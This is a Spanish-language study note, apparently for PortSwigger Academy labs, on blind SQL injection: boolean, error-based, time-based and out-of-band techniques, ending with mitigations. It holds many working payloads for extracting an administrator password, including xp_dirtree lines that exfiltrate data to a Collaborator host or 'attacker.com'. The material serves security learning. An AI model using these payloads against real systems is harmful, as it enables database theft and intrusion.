# Blind SQL Injection



Una **Blind SQL injection** ocurre cuando la aplicación es vulnerable a inyección SQL, pero **no muestra en la respuesta HTTP** ni los resultados de la query ni mensajes de error de la base de datos.
Esto imposibilita técnicas visibles como ataques con `UNION`, pero aún se puede explotar mediante otras estrategias.

---

## Técnicas de explotación en Blind SQLi

### 1. Boolean-based

1. Confirmar que el parámetro es vulnerable con condiciones triviales (`' AND '1'='1` / `' AND '1'='2`).

La aplicación cambia de comportamiento según si la condición inyectada es verdadera o falsa.
Ejemplo con cookie `TrackingId`:

```http
Cookie: TrackingId=xyz' AND '1'='1   --> devuelve "Welcome back"
Cookie: TrackingId=xyz' AND '1'='2   --> no devuelve "Welcome back"
```

2. Determinar la longitud aproximada probando `LENGTH`/`LEN` con booleanos o avanzando hasta obtener false cuando la posición excede la longitud.
 ```sql
  ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10 --
  ```

Esto permite inferir bit a bit datos sensibles con funciones como `SUBSTRING`:

3. Para posición `i` probar caracteres `c` hasta encontrar el verdadero:

   * `' AND SUBSTRING((SELECT Password ...), i, 1) = 'c' -- `
   * o usar comparaciones `>` / `<` para acelerar (`> 'm'`, etc.) usando ASCII

Ejemplo:
```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s
```
Conviene usar el intruder con el payload `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--`

Metodología completa: 
[Boolean_based](https://github.com/juanpoch/PortSwigger_Academy/blob/main/Server-side/1_SQL_injection/3_Blind_SQLi/Boolean_based.md)

---

[Lab: Blind_SQL_injection_with_conditional_responses](1_Blind_SQL_injection_with_conditional_responses.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)

---

### 2. Error-based

Si la aplicación filtra los resultados pero **sí muestra errores del motor SQL**, podemos usarlos para inferir datos.

* **Condicionales con errores**:

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Si `1=1`, se produce error de división por cero → respuesta diferente.

* **Errores verbosos**:
  Malas configuraciones pueden devolver el query entero o incluso datos. Ejemplo:

```sql
CAST((SELECT password FROM users) AS int)
```

Error devuelto:

```
ERROR: invalid input syntax for type integer: "S3curePwd"
```

Esto convierte una blind SQLi en visible.

[Error_based](Error_based.md)

[SQL Cheat Sheaet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

[Lab: Blind_SQL_injection_with_conditional_errors](2_Blind_SQL_injection_with_conditional_errors.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)

---

### 3. Extraer datos a través de mensajes de error SQL verbosos



Un mensaje de error SQL verboso es una respuesta que incluye detalles internos de la consulta que la aplicación construyó y/o los valores que provocaron el error. Esto suele ser consecuencia de configuraciones de depuración activadas o mala práctica.

Estos mensajes pueden revelar:

* la **estructura completa** de la consulta SQL construida por la app (columnas, cláusulas);
* la **posición** donde tu entrada fue insertada (p.ej. dentro de comillas);
* **valores** retornados por subqueries (si el error incluye esos valores).

Con esta información, una vulnerabilidad que era "blind" puede transformarse en "visible" y facilitar la explotación.

---

### Ejemplo típico: "Unterminated string literal"

Si inyectás una comilla simple (`'`) en un parámetro `id` y la app devuelve:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Interpretación:

* La app te muestra **la consulta completa** que ejecutó: `SELECT * FROM tracking WHERE id = '` + tu input.
* Vemos que el parámetro fue insertado **dentro de una cadena** entrecomillada con `'`.
* Con esa pista, ahora sabés cómo cerrar la comilla y cómo comentar el resto de la consulta (`-- ` o `/* */`) para manipular la sintaxis sin romperla.

**Qué hacer con esta información:**

* Si la app mantiene esa verbosidad, podés adaptar payloads con confianza (cerrar comillas, usar `UNION`, etc.).

---

### Forzar errores que revelen datos: rol de `CAST()`

`CAST(expr AS type)` convierte `expr` a `type`. Si `expr` tiene un formato no convertible al tipo destino, el motor lanzará un error que **puede incluir el valor original**.

Ejemplo conceptual:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Si `example_column` contiene la cadena `Example data`, intentar convertirla a entero (`int`) puede producir un error como:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Este mensaje revela el contenido de `example_column`.

**Por qué es útil:** convierte una subconsulta que devuelve un string en una fuente de información visible — el error muestra la cadena.

---

### Sintaxis y comportamiento por SGBD

> Atención: hay diferencias en funciones y mensajes; adapta payloads por motor.

#### MySQL

* `CAST(expr AS SIGNED)` o `CAST(expr AS UNSIGNED)` o `CAST(expr AS DECIMAL)` puede provocar errores de conversión. Mensajes pueden ser menos verbosos según configuración.
* Alternativas específicas para MySQL: `UPDATEXML()` o `EXTRACTVALUE()` con subselects pueden producir errores que contienen los datos.

**Ejemplo MySQL:**

```sql
' AND (SELECT CAST((SELECT some_column FROM some_table LIMIT 1) AS SIGNED))--
```

Si `some_column` = 'abc', es probable que se produzca un error del tipo “invalid integer” que incluya 'abc'.

#### PostgreSQL

* `CAST(expr AS INTEGER)` o `expr::integer` provoca `invalid input syntax for integer: "..."` mostrando el texto no convertible.

**Ejemplo Postgres:**

```sql
' AND (SELECT CAST((SELECT column FROM table LIMIT 1) AS INTEGER))--
```

Si devuelve texto, el error suele mostrar exactamente el texto que falló.

#### Microsoft SQL Server

* `CAST(expr AS INT)` o `CONVERT(INT, expr)` pueden lanzar errores parecidos a `Conversion failed when converting the varchar value '...' to data type int.` que incluyen el valor.

**Ejemplo MSSQL:**

```sql
' AND (SELECT CAST((SELECT TOP 1 column FROM table) AS INT))--
```

#### Oracle

* `CAST(expr AS NUMBER)` puede lanzar `ORA-01722: invalid number` y a veces mostrar el valor problemático según contexto. Oracle suele ser menos verboso por defecto.
* Recordá que en Oracle hay que usar `FROM DUAL` para selects que no leen tablas.

**Ejemplo Oracle:**

```sql
' AND (SELECT CAST((SELECT column FROM users WHERE ROWNUM=1) AS NUMBER) FROM DUAL)--
```

#### SQLite

* `CAST(expr AS INTEGER)` produce `datatype mismatch` o errores que incluyen el texto.

---

### Cómo formar un payload efectivo

1. **Identifica contexto**: ¿estás dentro de comillas? ¿en WHERE, in SELECT, in FROM? Un mensaje de error tipo "unterminated string" ya lo dice.
2. **Usa `CAST()`** para convertir la salida de una subconsulta a un tipo incompatible y provocar error que contenga el valor.
3. **Controla filas**: usa `LIMIT 1` / `TOP 1` / `ROWNUM=1` para que la subconsulta no devuelva múltiples filas y lance error de subquery multivalued.
4. **Comenta el resto**: si necesitas cerrar la comilla abierta y evitar que la aplicación agregue más SQL, termina con `-- ` o con el comentario de bloque.
5. **Observa el mensaje** y extrae el valor mostrado.

**Payload plantilla (MySQL/Postgres style)**

```
?id=1' AND (SELECT CAST((SELECT column FROM users LIMIT 1) AS INTEGER))--
```

Si `column` contiene 's3cret', el DB puede responder con `invalid input syntax for integer: "s3cret"` y así lo ves.

---

### Ejemplos concretos y anotados

### Caso A — detectando contexto con "unterminated string"

1. Inyectás `'` en `?id=1`.
2. La app devuelve: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''`.
3. Conclusión: el parámetro fue insertado dentro de una cadena `'...'` en la consulta. Ahora puedes cerrar esa comilla y comentar el resto para inyectar:

```
?id=1' UNION SELECT username, password FROM users --
```

(si la estructura de columnas lo permite).

### Caso B — usar `CAST()` para ver un valor

```
?id=1' AND CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS INTEGER)--
```

Respuesta (ejemplo Postgres):

```
ERROR: invalid input syntax for integer: "S3curePwd"
```

Resultado: obtuviste el valor "S3curePwd" en el mensaje de error.

---

[Lab: Visible_error-based_SQL_injection](3_Visible_error-based_SQL_injection.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)

---

### 4. Time-based

Si la app no muestra errores y el comportamiento no cambia, se fuerza un **retraso condicional**:

* **MSSQL**:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- demora 10s
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- sin demora
```

* **MySQL**:

```sql
' OR IF(1=1, SLEEP(5), 0)--
```

La diferencia en el tiempo de respuesta revela si la condición es verdadera.

Se pueden extraer caracteres de forma binaria:

```sql
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='Administrator')>'m' WAITFOR DELAY '0:0:5'--
```

### 4. Out-of-band (OAST)

Si la query se ejecuta de forma asincrónica o no altera la respuesta/tiempo, se puede provocar una **interacción externa (DNS, HTTP, SMB)** hacia un servidor controlado por el atacante.

Ejemplo en MSSQL con Burp Collaborator:

```sql
'; exec master..xp_dirtree '//abc123.burpcollaborator.net/a'--
```

Genera una consulta DNS → detectada por Collaborator.

Incluso se puede exfiltrar datos:

```sql
'; DECLARE @p varchar(1024);
   SET @p=(SELECT password FROM users WHERE username='Administrator');
   exec('master..xp_dirtree "//'+@p+'.abc123.burpcollaborator.net/a"')--
```

La contraseña queda embebida en el subdominio.

---

## Ejemplos de payloads por técnica

* **Boolean-based**:

```
' AND '1'='1--
' AND SUBSTRING((SELECT user()),1,1)='r'--
```

* **Error-based**:

```
' AND CAST((SELECT database()) AS int)--
```

* **Time-based**:

```
' OR IF(ASCII(SUBSTRING(user(),1,1))>77, SLEEP(5), 0)--  # MySQL
```

* **Out-of-band**:

```
'; exec master..xp_dirtree '//attacker.com/a'--
```

---

## Mitigación

Las medidas son las mismas que para SQLi clásica:

* **Usar consultas parametrizadas**.
* No construir SQL con concatenación de input.
* **Principio de menor privilegio** para la cuenta de BD.
* **Errores genéricos para el cliente**, logs detallados en servidor.
* Monitoreo de patrones anómalos y WAF.

---
